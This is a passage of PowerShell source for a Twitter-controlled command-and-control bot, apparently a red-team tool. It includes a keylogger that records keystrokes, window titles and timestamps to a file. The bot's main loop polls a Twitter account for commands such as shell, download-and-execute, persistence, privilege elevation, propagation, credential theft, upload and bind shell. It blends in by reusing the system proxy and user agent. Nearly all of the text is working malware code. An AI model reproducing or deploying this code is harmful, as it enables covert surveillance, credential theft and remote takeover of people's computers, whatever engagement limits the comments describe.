                                    if ((($LeftShift -eq -32767) -or ($RightShift -eq -32767)) -or (($LeftShift -eq -32768) -or ($RightShfit -eq -32768))) {$LogOutput += '[Shift] '}
                                    if ((($LeftCtrl -eq -32767) -or ($LeftCtrl -eq -32767)) -or (($RightCtrl -eq -32768) -or ($RightCtrl -eq -32768))) {$LogOutput += '[Ctrl] '}
                                    if ((($LeftAlt -eq -32767) -or ($LeftAlt -eq -32767)) -or (($RightAlt -eq -32767) -or ($RightAlt -eq -32767))) {$LogOutput += '[Alt] '}
                                    if (($TabKey -eq -32767) -or ($TabKey -eq -32768)) {$LogOutput += '[Tab] '}
                                    if (($SpaceBar -eq -32767) -or ($SpaceBar -eq -32768)) {$LogOutput += '[SpaceBar] '}
                                    if (($DeleteKey -eq -32767) -or ($DeleteKey -eq -32768)) {$LogOutput += '[Delete] '}
                                    if (($EnterKey -eq -32767) -or ($EnterKey -eq -32768)) {$LogOutput += '[Enter] '}
                                    if (($BackSpaceKey -eq -32767) -or ($BackSpaceKey -eq -32768)) {$LogOutput += '[Backspace] '}
                                    if (($LeftArrow -eq -32767) -or ($LeftArrow -eq -32768)) {$LogOutput += '[Left Arrow] '}
                                    if (($RightArrow -eq -32767) -or ($RightArrow -eq -32768)) {$LogOutput += '[Right Arrow] '}
                                    if (($UpArrow -eq -32767) -or ($UpArrow -eq -32768)) {$LogOutput += '[Up Arrow] '}
                                    if (($DownArrow -eq -32767) -or ($DownArrow -eq -32768)) {$LogOutput += '[Down Arrow] '}
                                    if (($LeftMouse -eq -32767) -or ($LeftMouse -eq -32768)) {$LogOutput += '[Left Mouse] '}
                                    if (($RightMouse -eq -32767) -or ($RightMouse -eq -32768)) {$LogOutput += '[Right Mouse] '}

                                    #check for capslock
                                    [bool] $CapsLock = [console]::CapsLock 
                                    if ($CapsLock -eq $True) {$LogOutput += '[Caps Lock] '}
                
                                    $MappedKey = $ImportDll::MapVirtualKey($VirtualKey, 0x03)
                                    $KeyboardState = New-Object Byte[] 256
                                    $CheckKeyboardState = $ImportDll::GetKeyboardState($KeyboardState)

                                    #create a stringbuilder object
                                    $StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                                    $UnicodeKey = $ImportDll::ToUnicode($VirtualKey, $MappedKey, $KeyboardState, $StringBuilder, $StringBuilder.Capacity, 0)

                                    #convert typed characters
                                    if ($UnicodeKey -gt 0) {
                                        $TypedCharacter = $StringBuilder.ToString()
                                        $LogOutput += ('['+"$($TypedCharacter)"+']')
                                    }
                
                                    #get the title of the foreground window
                                    $TopWindow = $ImportDll::GetForegroundWindow()
                                    [int32] $WindowPid = (Get-Process | Where-Object { $_.mainwindowhandle -eq $TopWindow }).Id
                                    [string] $WindowTitle = (Get-Process -pid $WindowPid).mainWindowTitle

                                    #get the current DTG
                                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                
                                    #Create a custom object to store results
                                    $ObjectProperties = @{'Key Typed' = $LogOutput;
                                                          'Time' = $TimeStamp;
                                                          'Window Title' = $WindowTitle}
                                    $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                
                                    #return results
                                    Out-File -FilePath $OutPath -Append -InputObject $ResultsObject                               
                                }
                            }      
                        }
        
                        catch {Write-Verbose $Error[0]}   
                    }   
                }

            Start-job -InitializationScript $ScriptBlock -ScriptBlock {for (;;) {LogKey}} | Out-Null
        }
        
        #Function to cause the bot to wait for different time periods
        Function RandomWait {
            #Randomly pick a sleeping interval from specified values, Twitter will block anything more than 150 in an hour so no faster than 24 seconds should work
            [int32] $SecondsToWait = (Get-Random -InputObject 24, 29, 33, 39, 48, 69, 81, 193, 263)
            #Start sleeping
            Write-Verbose "Sleeping for $SecondsToWait seconds"
            Start-Sleep -Seconds $SecondsToWait
        }
        
        #Function to make sure this doesn't execute passed your assessment dates
        Function CheckKillDate {
            #Check to see if kill date has passed
            $DateCheck = (Get-Date) -lt (Get-Date $EndDate)
                if ($DateCheck -ne $True)  {
                    Write-Verbose "Kill date has passed. Exiting"
                    Exit
                }
        }           
        
        #Function to make sure that the script doesn't generate network traffic during off hours
        Function CheckWorkHours {
            #Check to see if its between work hours
            $StartTimeCheck = (Get-Date) -ge (Get-Date $WorkStart)
            $EndTimeCheck = (Get-Date) -le (Get-Date $WorkEnd)    
                if (($StartTimeCheck -eq $True) -and ($EndTimeCheck -eq $True)) {
                    Write-Verbose "It is during work hours. Continuing"
                }
                
                else {
                    Write-Verbose "Not during work hours. Restarting"
                    Invoke-TwitterBot
                }
        }
        
        #Function to ensure that the IP is a valid target to prevent running on off-limits machines        
        Function CheckIPAddress {
            #Check to see if IP address is in allowed range
            Write-Verbose "The following IPs are allowed: $EngagementIPs"
            #Lists all ip addresses (IPV4 and IPV6) for all adapters as an array: $HostIpAddresses = @([System.Net.Dns]::GetHostEntry($env:COMPUTERNAME).addresslist.ipaddresstostring)
            #This only returns IPV4 but works more reliably
            $HostIpAddresses = [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | % {$_.GetIPProperties()} | %{$_.UnicastAddresses} | % {$_.Address} | ? {$_.Address} | % {$_.IPAddressToString}
            
            [string[]] $CheckAnswer = @()
                
                foreach ($IpAddress in $HostIpAddresses) { 
                    $CheckAnswer += $EngagementIPs.Contains("$IpAddress")
                    Write-Verbose "Checking if $IpAddress is allowed"
                    Write-Verbose $CheckAnswer[-1]
                }
            
                if ($CheckAnswer -notcontains "True") {
                    Write-Verbose "No allowed IP address found. Checking external IP"
                    #Lets check the external IP in case it is NAT'd
                    #Changed site to ifconfig.me thanks to Matt Graeber
                    $ExternalIpAddress = $WebClientObject.downloadString('http://ifconfig.me/ip')
                    $CheckAnswer += $AllowedAddress.Contains("$ExternalIpAddress")
                    $WebClientObject.Dispose()
                }

                if ($CheckAnswer -notcontains "True") {
                    Write-Verbose "No allowed internal or external addresses found. Exiting"
                    Exit
                }
         
            Write-Verbose "Allowed IP address found. Continuing"
        }

        #Function to grab the latest tweet
        Function GetLatestTweet {
            #Check the C2 twitter feed for new instructions
            [string] $TwitterAPIv1URL = "http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=$TwitterUserName&count=1&page=1"
            Write-Verbose "The C2 twitter handle is:  $TwitterUserName"
            Write-Verbose "Checking latest tweet at:  $TwitterAPIv1URL"
            [xml] $XMLTwitterResult = $WebClientObject.downloadString($TwitterAPIv1URL)
            [string] $LatestTweet = $XMLTwitterResult.statuses.status.text
            [int32] $TweetLength = $LatestTweet.Length
            Write-Verbose "The LatestTweet is:  $LatestTweet"
            Write-Verbose "The tweet contains $TweetLength characters"
            $WebClientObject.Dispose()
            Return $LatestTweet
        }

#############################CONFIG DATA##################################            
            #$ErrorActionPreference = 2           
            [string] $TwitterUserName = '@Trust_No_001'
            [string] $EndDate = '2016-03-13'
            [bool] $IsAdmin = $False
            [string] $WorkStart = '09:00'
            [string] $WorkEnd = '20:00'
            #This string will be used to locate things that are tagged for uploading try '[System.Guid]::NewGuid().ToString()'
            [string] $UniqueString = 'f766d092-be75-4ce7-bd43-59814c61b7eb'
            
            <#
                To add ranges of IP addresses to the EngagementIPs array:
                $EngagementIPs += (33..46 | foreach {$Network = $_; 1..254 | foreach {"192.168.$net.$_"}})
            #>
            
            [string[]] $EngagementIPs = @()
            #Add 192.168.1.0/24 to the EngagmentIPs using 2 different methods
            $EngagementIPs += '192.168.1.1','192.168.1.6','192.168.43.248'
            $EngagementIPs += (3..254 | foreach {"192.168.1.$_"})

###########################################################################            
        
            $WebClientObject = New-Object System.Net.WebClient
            $WebProxyObject = New-Object System.Net.WebProxy
            
       try {
        
            #Run configuration and control check functions
            Write-Verbose "Running RandomWait"
            RandomWait
            Write-Verbose "Running CheckKillDate"
            CheckKillDate
            Write-Verbose "Running CheckIPAddress"
            CheckIPAddress
            Write-Verbose "Runing CheckWorkHours"
            CheckWorkHours
            
            #Check to see if we are running with admin rights
            $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
            Write-Verbose "Are we running as admin? $IsAdmin"            

            #Check to see if a proxy is configured and if it is, use it
            $ProxyCheck = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable
            
                if ($ProxyCheck -eq 1) {
                    Write-Verbose "Proxy configuration found, enabling proxy settings"
                    [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
                    $WebProxyObject.Address = $ProxyAddress
                    $WebProxyObject.UseDefaultCredentials = $True
                    $WebClientObject.Proxy = $WebProxyObject
                }

            #Pull the user agent string from the registry
            [string] $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent'
            $WebClientObject.Headers.Add("user-agent", $UserAgent)
            
            [string] $LatestTweet = GetLatestTweet          
            
            Write-Verbose "The latesttweet is $LatestTweet"
            Write-Verbose "Comparing to $LastTweet"
                                            
            #Compares tweet to old tweet to make sure the instruction is new
            if ($LatestTweet -eq $LastTweet) {
                Write-Verbose "There are no new instructions"
                Invoke-TwitterBot
            }
            
            [string] $BotCommand = $LatestTweet.split('|')[0]

            Write-Verbose "Evaluating command $BotCommand"
            Switch ($BotCommand) {
                !quit {Exit}
                !change {ChangeCommand}
                !speak {SpeakCommand}
                !run {RunCommand}
                !downexec {downexecCommand}
                !download {downloadCommand}
                !rickroll {RickrollCommand}
                !shell {ShellCommand}
                !sleep {Sleepcommand}
                !thunderstruck {ThunderstruckCommand}
                !eicar {EicarCommand}
                !screenshot {ScreenshotCommand}
                !popup {PopupCommand}
                !persist {PersistCommand}
                !elevate {ElevateCommand}
                !propagate {PropagateCommand}
                !wallpaper {WallpaperCommand}
                !packetcapture {PacketCaptureCommand}
                !getsystem {GetSystemCommand}
                !bindshell {BindShellCommand}
                !upload {UploadCommand}
                !credential {CredentialCommand} 
                !keylog {KeylogCommand}                   
            }
       }

        catch {
            Write-Verbose 'Error has occurred. Restarting'
            Invoke-Twitterbot
        }

        finally {
            #Make the processed tweet the "lasttweet" so that it can be compared against in the next loop
            Write-Verbose "Making the latest tweet the last tweet for comparing."
            [string] $Global:LastTweet = $LatestTweet 
        }   
    }
 #Loop forever (or until !quit or kill date has passed)
    for (;;) {
        Invoke-Bot -Verbose
    }
}
